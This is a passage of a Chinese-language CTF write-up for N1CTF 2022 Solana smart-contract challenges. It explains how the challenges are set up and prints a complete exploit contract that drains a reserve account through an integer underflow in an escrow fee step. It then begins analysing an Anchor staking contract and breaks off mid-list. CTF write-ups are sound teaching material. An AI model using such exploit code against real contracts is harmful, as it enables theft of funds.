\u5408\u7ea6\u5728\u4e0a\u94fe\u7684\u65f6\u5019\u9700\u8981\u7f16\u8bd1\u6210 BPF\uff08Berkley Packer Filter\uff09\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a .so \u6587\u4ef6</li> <li>ChallengeBuilder::input_program \u65b9\u6cd5\u53ef\u4ee5\u901a\u8fc7\u6e90\u7801\u770b\u51fa\u9996\u5148\u8f93\u5165\u7a0b\u5e8f\u957f\u5ea6\uff0c\u7136\u540e\u8bfb\u53d6 .so \u7684\u5b57\u8282\u5e8f\u5217</li> </ul> </li> <li>\u521b\u5efa\u7528\u6237\u8d26\u6237\u5e76\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey\uff1a     <pre><code>let user = Keypair::new();\n\nwriteln!(socket, \"program pubkey: {}\", program_pubkey)?;\nwriteln!(socket, \"solve pubkey: {}\", solve_pubkey)?;\nwriteln!(socket, \"user pubkey: {}\", user.pubkey())?;\n</code></pre></li> <li>\u6839\u636e program_pubkey \u6765\u627e\u5230 reserve \u8d26\u6237\uff1a     <pre><code>let (reserve, _) = get_reserve(program_pubkey);\n</code></pre><ul> <li>\u5176\u4e2d get_reserve \u51fd\u6570\u5728 processor.rs \u4e2d\u5b9a\u4e49\uff1a     <pre><code>pub fn get_reserve(program: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"RESERVE\".as_bytes()], &amp;program)\n}\n</code></pre></li> <li>\u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u4e00\u4e2a\u662f solana \u7684\u8d26\u6237\u5206\u4e3a\u4e00\u822c\u8d26\u6237\u548c PDA\uff08Program Derived Address\uff09<ul> <li>PDA \u4e00\u822c\u662f\u7531\u7a0b\u5e8f\u751f\u6210\u7528\u6765\u8bb0\u5f55\u6570\u636e\u7684</li> <li>PDA \u7684\u8ba1\u7b97\u662f\u6839\u636e seed \u548c program_id\uff08\u4e5f\u5c31\u662f\u7a0b\u5e8f\u7684 pubkey\uff09\u505a\u54c8\u5e0c\u6765\u751f\u6210\u7684</li> <li>\u4f46\u662f PDA \u8981\u4fdd\u8bc1\u4e0d\u662f\u53ef\u7528\u7684 Pubkey\uff08\u8fd9\u4e2a\u8fd8\u6ca1\u7406\u89e3\uff09\uff0c\u6240\u4ee5 hash \u7684\u65f6\u5019\u8981\u518d\u52a0\u4e00\u4e2a\u53c2\u6570 bump\uff1apda = hash(seed, bump, program_id)</li> <li>\u5bfb\u627e\u4e00\u4e2a PDA \u7684\u65f6\u5019\u4f1a\u4ece 0 \u5230 256 \u679a\u4e3e bump\uff0c\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u751f\u6210\u6709\u6548 PDA \u7684 bump \u79f0\u4e3a canonical bump\uff0c\u800c\u4e14\u4e00\u822c\u5c31\u4f7f\u7528\u8fd9\u4e2a PDA</li> <li>\u6240\u4ee5\u6839\u636e\u76f8\u540c seed\u3001\u76f8\u540c program_id \u751f\u6210\u7684 PDA \u4e5f\u662f\u76f8\u540c\u7684\u3002Pubkey::find_program_address \u505a\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f seed\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f program_id</li> </ul> </li> <li>\u6240\u4ee5 reserve \u662f\u4e00\u4e2a\u7531 RESERVE seed \u548c program_pubkey \u751f\u6210\u7684 PDA</li> </ul> </li> <li>\u4e3a account \u589e\u52a0\u521d\u59cb lamports\uff08\u94b1\uff09\uff1a     <pre><code>const TARGET_AMT: u64 = 60_000;\nconst INIT_BAL: u64 = 50;\nconst RESERVE_BAL: u64 = 1_000_000;\n\nbuilder\n    .builder\n    .add_account_with_lamports(user.pubkey(), system_program::ID, INIT_BAL);\nbuilder\n    .builder\n    .add_account_with_lamports(reserve, system_program::ID, RESERVE_BAL);\n</code></pre><ul> <li>\u7ed9 user 50 lamports</li> <li>\u7ed9 reserve 1000000 lamports</li> </ul> </li> <li>\u6784\u5efa challenge\u3001\u8f93\u51fa user \u521d\u59cb lamports\uff1a     <pre><code>let mut challenge = builder.build();\n\nlet balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\nwriteln!(socket, \"user lamport before: {:?}\", balance)?;\n</code></pre></li> <li>\u63a5\u6536\u6307\u4ee4\uff0c\u4ea4\u7ed9\u7528\u6237\u5408\u7ea6\u6267\u884c\uff1a     <pre><code>challenge.input_instruction(solve_pubkey, &amp;[&amp;user]).unwrap();\n</code></pre><ul> <li>\u8fd9\u91cc\u7684 input_instruction \u65b9\u6cd5\u4e5f\u662f\u5728 sol-ctf-framework \u4e2d\u5b9a\u4e49\u7684\uff0c\u8f93\u5165\u65b9\u6cd5\u8f83\u590d\u6742\uff0c\u4e0d\u8fc7\u597d\u5728\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4e2a solve.py \u7528\u6765\u4ea4\u4e92\u8f93\u5165\u6307\u4ee4</li> </ul> </li> <li>\u68c0\u67e5\u76ee\u6807\uff0c\u8fbe\u5230\u5219\u4e0b\u53d1 flag\uff1a     <pre><code>let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\nwriteln!(socket, \"user lamport after: {:?}\", balance)?;\n\nif balance &gt; TARGET_AMT {\n    let flag = fs::read_to_string(\"flag.txt\").unwrap();\n    writeln!(\n        socket,\n        \"Flag: {}\",\n        flag\n    )?;\n}\n</code></pre><ul> <li>\u53ef\u89c1\u76ee\u6807\u662f\u4f7f user \u62e5\u6709\u7684 lamports \u5927\u4e8e 60000 lamports</li> </ul> </li> </ul> <p>\u8fd9\u6837\u6211\u4eec\u7684\u653b\u51fb\u65b9\u5f0f\u5c31\u5f88\u660e\u663e\u4e86\uff1a</p> <ul> <li>\u5148\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Init \u6307\u4ee4\u5b8c\u6210\u521d\u59cb\u5316\uff08\u9898\u76ee\u5df2\u7ecf\u5199\u597d\uff09</li> <li>\u518d deposit 11 lamports\uff0c\u4f7f\u7528\u6237\u5bf9\u5e94\u7684 escrow \u7684 amount \u8bb0\u4e3a 11</li> <li>\u7136\u540e pay 11 lamports\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u6536\u53d6 11 lamports \u800c\u662f\u6536\u53d6\u57fa\u7840\u8d39\u7528 15 lamports\u3002escrow \u7684 amount \u4ece 11 \u51cf\u53bb 15 \u53d1\u751f\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230 65531\uff0c\u6b64\u65f6 withdraw \u7684\u8bdd reserve \u6709 1000000 \u8db3\u591f\u652f\u4ed8\uff0c\u63d0\u51fa\u6765\u540e\u4e5f\u53ef\u4ee5\u8fbe\u5230\u9898\u76ee 60000 \u7684\u76ee\u6807</li> <li>\u76f4\u63a5 withdraw \u5373\u53ef</li> </ul> <p>\u6240\u4ee5\u53ea\u9700\u8981\u5c06\u8fd9\u4e9b\u6b65\u9aa4\u90fd\u7167\u846b\u82a6\u753b\u74e2\u5199\u5728 processor.rs \u7684 process_instruction \u4e2d\u5373\u53ef\uff1a</p> exp \u5408\u7ea6 <pre><code>pub fn process_instruction(\n    _program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    _data: &amp;[u8],\n) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n    let utility_program = next_account_info(account_iter)?;\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog_account = next_account_info(account_iter)?;\n\n    invoke(\n        &amp;Instruction {\n            program_id: *utility_program.key,\n            accounts: vec![\n                AccountMeta::new(*user.key, true),\n                AccountMeta::new(*reserve.key, false),\n                AccountMeta::new(*escrow_account.key, false),\n                AccountMeta::new_readonly(system_program::id(), false),\n            ],\n            data: ServiceInstruction::Init { }\n                .try_to_vec()\n                .unwrap(),\n        },\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    invoke(\n        &amp;deposit_escrow(\n            *utility_program.key, \n            *user.key, \n            *reserve.key, \n            *escrow_account.key, \n            11,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    invoke(\n        &amp;pay_utility_fees(\n            *utility_program.key, \n            *user.key, \n            *reserve.key, \n            *escrow_account.key, \n            11,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],        \n    )?;\n\n    invoke(\n        &amp;withdraw_escrow(\n            *utility_program.key,\n            *user.key,\n            *reserve.key,\n            *escrow_account.key,\n        ),\n        &amp;[\n            reserve.clone(),\n            escrow_account.clone(),\n            user.clone(),\n            sys_prog_account.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n</code></pre> <p>\u4e4b\u540e\u5229\u7528 cargo build-bpf\uff08\u9700\u8981\u5148\u5b89\u88c5 solana\uff09\u7f16\u8bd1\u51fa .so \u6587\u4ef6\uff0c\u518d\u4ea4\u7ed9 solve.py \u811a\u672c\u4ea4\u9898\u5373\u53ef\u3002</p> <p>flag: n1ctf{cashback_\u2026\u2026}</p>"},{"location":"writeups/n1ctf2022/#simple-staking","title":"Simple Staking","text":"<p>\u540c\u6837\u4e5f\u662f solana \u5408\u7ea6\uff0c\u4e0d\u8fc7\u7528\u4e86 anchor lang\uff1ahttps://www.anchor-lang.com/ \uff0c\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u5199\u6cd5\uff0c\u4f46\u770b\u770b\u6587\u6863\u8fd8\u633a\u597d\u61c2\u7684</p> <p>\u8fd8\u662f\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\uff1a</p>"},{"location":"writeups/n1ctf2022/#_1","title":"\u9898\u76ee\u5408\u7ea6","text":"<p>anchor lang \u7684\u8bed\u6cd5\u770b\u8d77\u6765\u5c31\u662f\u628a\u5904\u7406\u51fd\u6570\u5c01\u88c5\u5728\u4e00\u4e2a mod \u4e2d\u7136\u540e\u7528 <code>#[program]</code> \u5b8f\u6765\u5904\u7406\u3002</p> <p>\u8fd9\u4e2a mod \u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u4f1a\u88ab\u5904\u7406\u6210\u4e00\u4e2a\u6307\u4ee4\uff0c\u5b83\u4eec\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a Context \u6cdb\u578b\uff0c\u5176\u4f9d\u8d56\u7684\u662f\u9488\u5bf9\u6bcf\u79cd\u6307\u4ee4\u7684\u7ed3\u6784\u4f53 Accounts\uff08\u5373 Context\uff09\uff0c\u7136\u540e\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u5229\u7528 ctx.accounts.? \u6765\u83b7\u53d6\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u7684\u5404\u4e2a account\u3002 <p>\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u4f1a\u4f7f\u7528 <code>#[derive(Accounts)]</code> \u5b8f\u6765\u8fdb\u884c\u5904\u7406\u3002\u5176\u4e2d\u6210\u5458\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>#[account()]</code> \u5b8f\u8fdb\u884c\u9650\u5b9a\uff0c\u5982\u679c\u8f93\u5165\u4e0d\u6ee1\u8db3\u9650\u5b9a\u5219\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u5199\u6cd5\u548c\u610f\u4e49\u53ef\u4ee5\u770b\u5b98\u65b9\u6587\u6863\u3002</p>"},{"location":"writeups/n1ctf2022/#initialize","title":"Initialize","text":"<ul> <li>\u5904\u7406\u51fd\u6570\u662f\u7a7a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u6240\u6709\u64cd\u4f5c\u90fd\u5728 Initialize \u7ed3\u6784\u4f53\u4e2d\u8fdb\u884c     <pre><code>pub fn initialize(_ctx: Context&lt;Initialize&gt;) -&gt; Result&lt;()&gt; {\n    Ok(())\n}\n</code></pre></li> <li>Initialize \u7ed3\u6784\u4f53\u5b57\u6bb5\uff1a<ul> <li>catalog\uff1a     <pre><code>#[account(\n    init,\n    seeds = [ b\"CATALOG\" ],\n    bump,   \n    payer = payer,\n    space = Catalog::SIZE,\n)]\npub catalog: Account&lt;'info, Catalog&gt;,\n</code></pre><ul> <li>init \u8868\u793a\u8fd9\u4e2a account \u9700\u8981\u521d\u59cb\u5316\uff08\u800c\u4e14\u4e0d\u80fd\u91cd\u590d\u8fdb\u884c\uff09</li> <li>seeds \u8868\u793a\u7528\u8fd9\u4e2a seed \u6765\u627e PDA</li> <li>bump \u8868\u793a\u8981\u8bb0\u5f55\u4e0b canonical bump\uff08\u53ef\u4ee5\u901a\u8fc7 <code>*ctx.bumps.get(\"catalog\").unwrap()</code> \u6765\u83b7\u53d6\u8fd9\u4e2a bump</li> <li>payer \u8868\u793a\u521b\u5efa\u8d26\u53f7\u8981\u7528\u7684 payer</li> <li>space \u7528\u6765\u786e\u5b9a\u5927\u5c0f\uff0c\u7531 Catalog \u89c4\u5b9a</li> <li>\u8fd9\u4e2a\u8d26\u6237\u5b58\u7684\u4fe1\u606f\uff08data\uff09\u662f Catalog \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff08\u5e8f\u5217\u5316\u540e\uff09Catalog \u5b9a\u4e49\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct Catalog {\n    pub orgs: Vec&lt;String&gt;,\n    pub ids: Vec&lt;String&gt;,\n}\nimpl Catalog {\n    pub const SIZE : usize = 8 \n        + 4 + (4 + MAXIMUM_STRING_SIZE) * MAXIMUM_CATALOG_SIZE   // orgs: Vec&lt;String&gt;,\n        + 4 + (4 + MAXIMUM_STRING_SIZE) * MAXIMUM_CATALOG_SIZE;  //  ids: Vec&lt;String&gt;,\n}\n</code></pre></li> </ul> </li> <li>reserve\uff1a     <pre><code>#[account(\n    init,\n    seeds = [ b\"RESERVE\" ],\n    bump,\n    payer = payer,\n    token::mint = mint,\n    token::authority = reserve\n)]\npub reserve: Account&lt;'info, TokenAccount&gt;,\n</code></pre><ul> <li>\u4e0e\u524d\u9762\u540c\u7406</li> <li>\u8fd9\u662f\u4e00\u4e2a TokenAccount\uff0c\u5176\u5b9a\u4e49\u5728 spl_token \u4e2d\uff0c\u662f\u4e00\u4e2a\u7c7b\u4f3c ERC20 \u7684\u4ee3\u5e01</li> </ul> </li> <li>\u5176\u5b83\uff1a     <pre><code>pub mint: Account&lt;'info, Mint&gt;,\n\n#[account(mut)]\npub payer: Signer&lt;'info&gt;,\npub token_program: Program&lt;'info, Token&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre><ul> <li>mint \u4e3a Token \u5408\u7ea6\u7684 mint \u8d26\u6237\uff0c\u7528\u6765\u7ed9 reserve \u63d0\u4f9b\u53c2\u6570 token::mint</li> <li>payer \u4e5f\u662f\u4e3a\u524d\u9762\u4e24\u4e2a\u63d0\u4f9b\u53c2\u6570</li> <li>token_program \u662f spl token \u7684 ID</li> <li>system_program \u662f\u9898\u76ee\u5408\u7ea6\u7684 ID</li> <li>rent \u662f solana \u7cfb\u7edf\u7684 rent ID\uff08\u4e0d\u7528\u7ba1\u8fd9\u4e2a\uff09</li> </ul> </li> </ul> </li> </ul>"},{"location":"writeups/n1ctf2022/#register","title":"Register","text":"<ul> <li>Register \u7ed3\u6784\u4f53\uff1a<ul> <li>catalog\uff1a     <pre><code>#[account(\n    mut,\n    seeds = [ b\"CATALOG\" ],\n    bump\n)]\npub catalog: Account&lt;'info, Catalog&gt;,\n</code></pre><ul> <li>\u6839\u636e\u8fd9\u4e2a seed \u6765\u83b7\u53d6\uff0c\u540c\u6837\u8bb0\u5f55 bump</li> </ul> </li> <li>employee_record\uff1a     <pre><code>#[account(\n    init,\n    seeds = [user.key().as_ref()],\n    bump,\n    payer = user,\n    space = EmployeeRecord::SIZE,\n)]\npub employee_record: Account&lt;'info, EmployeeRecord&gt;,\n</code></pre><ul> <li>\u548c\u524d\u9762 Initialize \u7684\u540c\u7406</li> <li>\u5176\u4e2d EmployeeRecord \u7ed3\u6784\u4f53\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct EmployeeRecord {\n    pub org: String,\n    pub id: String,\n    pub key: Pubkey,\n}\nimpl EmployeeRecord {\n    pub const SIZE : usize = 8 \n        + 4 + MAXIMUM_STRING_SIZE   // orgs: String,\n        + 4 + MAXIMUM_STRING_SIZE   //  ids: String,\n        + 32;                       //  key: Pubkey\n}\n</code></pre></li> </ul> </li> <li>\u5176\u5b83\uff1a     <pre><code>#[account(mut)]\npub user: Signer&lt;'info&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre></li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn register(ctx: Context&lt;Register&gt;, org_name: String, employee_id: String) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] register: org {}, id {}\", org_name, employee_id);\n    require!(\n        org_name.len() &lt; MAXIMUM_STRING_SIZE,\n        CoreError::StringTooLong\n    );\n\n    require!(\n        employee_id.len() &lt; MAXIMUM_STRING_SIZE,\n        CoreError::StringTooLong\n    );\n\n    let catalog = &amp;mut ctx.accounts.catalog;\n    require!(\n        ! ( catalog.orgs.contains(&amp;org_name) &amp;&amp; catalog.ids.contains(&amp;employee_id) ),\n        CoreError::DuplicatedEmployee\n    );\n    catalog.orgs.push(org_name.clone());\n    catalog.ids.push(employee_id.clone());\n\n    let employee_record = &amp;mut ctx.accounts.employee_record;\n    let employee_key = ctx.accounts.user.key();\n    employee_record.org = org_name;\n    employee_record.id  = employee_id;\n    employee_record.key = employee_key;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u9996\u5148\u9a8c\u8bc1 org_name \u548c employee_id \u7684\u957f\u5ea6</li> <li>\u68c0\u67e5 (org_name, employee_id) \u662f\u5426\u5728 catalog \u4e2d\u5b58\u5728\uff0c\u5b58\u5728\u5219\u62a5\u9519</li> <li>\u5c06 (org_name, employee_id) \u6dfb\u52a0\u5230 catalog \u4e2d</li> <li>\u4fee\u6539 employee_record</li> </ul> </li> </ul>"},{"location":"writeups/n1ctf2022/#deposit","title":"Deposit","text":"<ul> <li>Deposit \u7ed3\u6784\u4f53<ul> <li>vault\uff1a     <pre><code>#[account(\n    init_if_needed,\n    seeds = [org_name.as_bytes(), employee_id.as_bytes()],\n    bump,\n    space = Vault::SIZE,\n    payer = user \n)]\npub vault: Account&lt;'info, Vault&gt;,\n</code></pre><ul> <li>\u901a\u8fc7 [org_name, employee_id] \u8fd9\u4e2a seed \u83b7\u53d6 PDA</li> <li>Vault \u5b9a\u4e49\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct Vault {\n    pub amount : u64,\n}\nimpl Vault {\n    pub const SIZE : usize = 8 // DISCRIMINATOR_SIZE\n        + 8;                   // u64\n}\n</code></pre></li> </ul> </li> <li>employee_record\uff1a     <pre><code>#[account(\n    seeds = [user.key().as_ref()],\n    bump,\n    constraint = employee_record.org == org_name,\n    constraint = employee_record.id == employee_id,\n    constraint = employee_record.key == user.key(),\n)]\npub employee_record: Account&lt;'info, EmployeeRecord&gt;,\n</code></pre><ul> <li>\u8fd9\u91cc\u6709\u65b0\u51fa\u73b0\u7684 constraint\uff0c\u4f20\u53c2\u65f6\u4f1a\u68c0\u67e5\u5176\u5185\u5bb9\u662f\u5426\u4e3a true\uff0c\u4e0d\u662f\u7684\u8bdd\u5c31\u62a5\u9519\u7136\u540e revert</li> </ul> </li> <li>\u5176\u5b83     <pre><code>#[account(\n    mut,\n    seeds = [ b\"RESERVE\" ],\n    bump,\n    constraint = reserve.mint == mint.key(),\n)]\npub reserve: Account&lt;'info, TokenAccount&gt;,\n\n#[account(\n    mut,\n    constraint = user_token_account.owner == user.key(),\n    constraint = user_token_account.mint  == mint.key()\n)]\npub user_token_account: Account&lt;'info, TokenAccount&gt;,\n\npub mint: Account&lt;'info, Mint&gt;,\n\n#[account(mut)]\npub user: Signer&lt;'info&gt;,\npub token_program: Program&lt;'info, Token&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre></li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn deposit(ctx: Context&lt;Deposit&gt;, org_name: String, employee_id: String, amount: u64) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] deposit\");\n    let vault = &amp;mut ctx.accounts.vault;\n    let employee_record = &amp; ctx.accounts.employee_record;\n    let user = &amp; ctx.accounts.user;\n\n    require!(\n        user.key() == employee_record.key &amp;&amp; org_name == employee_record.org &amp;&amp; employee_id == employee_record.id,\n        CoreError::UnknownEmployee\n    );\n\n    let deposit_ctx = CpiContext::new(\n        ctx.accounts.token_program.to_account_info(),\n        Transfer {\n            from: ctx.accounts.user_token_account.to_account_info(),\n            to: ctx.accounts.reserve.to_account_info(),\n            authority: ctx.accounts.user.to_account_info()\n        }\n    );\n    token::transfer(deposit_ctx, amount)?;\n\n    vault.amount += amount;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u5148\u8bd5\u4e00\u7cfb\u5217\u68c0\u67e5\uff0c\u68c0\u67e5\u8f93\u5165\u662f\u5426\u5408\u6cd5</li> <li>\u7136\u540e\u8c03\u7528 spl token \u7684 transfer \u6307\u4ee4\u6765\u4ece user_token_account \u8f6c amount \u4e2a token \u7ed9 reserve</li> <li>\u4e3a vault \u7684 amount \u589e\u52a0 amount\uff08\u8fd9\u4e2a vault \u662f\u6839\u636e seed [org_name, employee_id] \u627e\u5230\u7684 PDA\uff09</li> </ul> </li> </ul>"},{"location":"writeups/n1ctf2022/#withdraw","title":"Withdraw","text":"<ul> <li>Withdraw \u7ed3\u6784\u4f53<ul> <li>\u5176\u5185\u5bb9\u548c Deposit \u51e0\u4e4e\u4e00\u81f4</li> <li>\u533a\u522b\u5728\u4e8e Deposit \u7684 user \u5728\u8fd9\u91cc\u53eb\u505a payer\uff0c\u4e0d\u8fc7\u7528\u5904\u5e94\u8be5\u6ca1\u53d8</li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn withdraw(ctx: Context&lt;Withdraw&gt;, org_name: String, employee_id: String, amount: u64) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] withdraw\");\n    let vault = &amp;mut ctx.accounts.vault;\n    let employee_record = &amp; ctx.accounts.employee_record;\n    let payer = ctx.accounts.payer.key();\n\n    require!(\n        payer == employee_record.key &amp;&amp; org_name == employee_record.org &amp;&amp; employee_id == employee_record.id,\n        CoreError::UnknownEmployee\n    );\n    require!(\n        vault.amount &gt;= amount,\n        CoreError::InsufficientBalance\n    );\n\n    let reserve_bump = [*ctx.bumps.get(\"reserve\").unwrap()];\n    let signer_seeds = [\n        b\"RESERVE\",\n        reserve_bump.as_ref()\n    ];\n    let signer = &amp;[&amp;signer_seeds[..]];\n\n    let withdraw_ctx = CpiContext::new_with_signer(\n        ctx.accounts.token_program.to_account_info(),\n        Transfer {\n            from: ctx.accounts.reserve.to_account_info(),\n            to: ctx.accounts.user_account.to_account_info(),\n            authority: ctx.accounts.reserve.to_account_info()\n        },\n        signer\n    );\n    token::transfer(withdraw_ctx, amount)?;\n\n    vault.amount -= amount;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u540c\u6837\u505a\u4e86\u5f88\u591a\u68c0\u67e5</li> <li>\u5229\u7528 spl token \u5408\u7ea6\u4ece reserve transfer amount token \u7ed9 user_account</li> <li>\u7ed9 vault.amount \u51cf\u5c11 amount</li> </ul> </li> </ul>"},{"location":"writeups/n1ctf2022/#_2","title":"\u9898\u76ee\u4ea4\u4e92\u90e8\u5206","text":"\u9898\u76ee\u4ea4\u4e92\u4ee3\u7801 <pre><code>async fn handle_connection(mut socket: TcpStream) -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {\n    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n    let chall_id = builder.add_program(\"./chall/target/deploy/chall.so\", Some(chall::ID));\n    let solve_id = builder.input_program()?;\n\n    let mut chall = builder.build().await;\n\n    // -------------------------------------------------------------------------\n    // [setup env] initialize\n    // -------------------------------------------------------------------------\n    let program_id = chall_id;\n\n    let mint = chall.add_mint().await?;\n\n    let payer_keypair = &amp;chall.ctx.payer;\n    let payer = payer_keypair.pubkey();\n\n    let user_keypair = Keypair::new();\n    let user = user_keypair.pubkey();\n    chall\n        .run_ix(system_instruction::transfer(&amp;payer, &amp;user, 100_000_000_000))\n        .await?;\n\n    let catalog = Pubkey::find_program_address(&amp;[b\"CATALOG\"], &amp;program_id).0;\n    let reserve = Pubkey::find_program_address(&amp;[b\"RESERVE\"], &amp;program_id).0;\n\n    println!(\"\\nAccounts created...\\n\");\n\n    let ix = chall::instruction::Initialize {};\n    let ix_accounts = chall::accounts::Initialize {\n        catalog,\n        reserve,\n        mint,\n        payer,\n        token_program: spl_token::ID,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            ix_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // -------------------------------------------------------------------------\n    // [setup env] register\n    // -------------------------------------------------------------------------\n    let org_name = String::from(\"product\");\n    let employee_id = String::from(\"employ_A\");\n    let ix = chall::instruction::Register {\n        org_name: org_name.clone(),\n        employee_id: employee_id.clone(),\n    };\n    let employee_record = Pubkey::find_program_address(&amp;[payer.as_ref()], &amp;program_id).0;\n    let reg_accounts = chall::accounts::Register {\n        catalog,\n        employee_record,\n        user: payer,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            reg_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // -------------------------------------------------------------------------\n    // [setup env] deposits 1_000\n    // -------------------------------------------------------------------------\n    let payer_token_account = chall.add_token_account(&amp;mint, &amp;payer).await?;\n    chall\n        .mint_to(1_000_u64, &amp;mint, &amp;payer_token_account)\n        .await?;\n\n    let vault = Pubkey::find_program_address(\n        &amp;[org_name.clone().as_bytes(), employee_id.clone().as_bytes()],\n        &amp;program_id,\n    )\n    .0;\n    let ix = chall::instruction::Deposit {\n        org_name: org_name.clone(),\n        employee_id: employee_id.clone(),\n        amount: 500_u64,\n    };\n    let ix_accounts = chall::accounts::Deposit {\n        vault,\n        employee_record,\n        reserve,\n        user_token_account: payer_token_account,\n        mint,\n        user: payer,\n        token_program: spl_token::ID,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            ix_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // TDOD: comment out\n    let reserve_account = chall.read_token_account(reserve).await?;\n    let reserve_balance = reserve_account.amount;\n    println!(\n        \"\\nvault = {}\\nreserve balance = {}\\n\",\n        vault, reserve_balance\n    );\n    // ----------------------------------------------------------------------------\n    // [setup env] done\n    // ----------------------------------------------------------------------------\n\n\n    let init_amount = 100_u64;\n    let user_record = Pubkey::find_program_address(&amp;[user.as_ref()], &amp;program_id).0;\n    let user_token_account_pubkey = chall.add_token_account(&amp;mint, &amp;user).await?;\n    chall\n        .mint_to(init_amount, &amp;mint, &amp;user_token_account_pubkey)\n        .await?;\n\n    writeln!(socket, \"user: {}\", user)?;\n    writeln!(socket, \"user_record: {}\", user_record)?;\n    writeln!(socket, \"catalog: {}\", catalog)?;\n    writeln!(socket, \"mint: {}\", mint)?;\n    writeln!(socket, \"user_token_account: {}\", user_token_account_pubkey)?;\n    writeln!(socket, \"reserve: {}\", reserve)?;\n\n    let bump_budget = ComputeBudgetInstruction::request_units(10_000_000u32, 0u32);\n    let solve_ix = chall.read_instruction(solve_id)?;\n    chall\n        .run_ixs_full(\n            &amp;[bump_budget, solve_ix],\n            &amp;[&amp;user_keypair],\n            &amp;user_keypair.pubkey(),\n        )\n        .await?;\n\n    let user_token_account = chall.read_token_account(user_token_account_pubkey).await?;\n    writeln!(\n        socket,\n        \"player_account_amount: {:?}\",\n        user_token_account.amount\n    )?;\n\n    println!(\n        \"\\nplayer_account_amount balance = {}\\n\",\n        user_token_account.amount\n    );\n\n    if user_token_account.amount &gt; init_amount {\n        writeln!(socket, \"congrats!\")?;\n        if let Ok(flag) = env::var(\"FLAG\") {\n            writeln!(socket, \"flag: {:?}\", flag)?;\n        } else {\n            writeln!(socket, \"flag not found, please contact admin\")?;\n        }\n    }\n\n    Ok(())\n}\n</code></pre> <ul> <li>\u8bfb\u53d6\u9898\u76ee\u5408\u7ea6\u548c\u7528\u6237\u8f93\u5165\u5408\u7ea6</li> <li>\u589e\u52a0 mint\u3001payer\u3001user \u8d26\u6237<ul> <li>\u521d\u59cb\u7ed9 user 100_000_000_000 lamports</li> </ul> </li> <li>\u83b7\u53d6\u5c5e\u4e8e\u9898\u76ee\u5408\u7ea6\u7684 catalog \u548c reserve PDA</li> <li>\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Initialize \u6307\u4ee4</li> <li>\u8c03\u7528 Register\uff0corg_name \u548c employee_id \u4e3a (\"product\", \"employ_A\")</li> 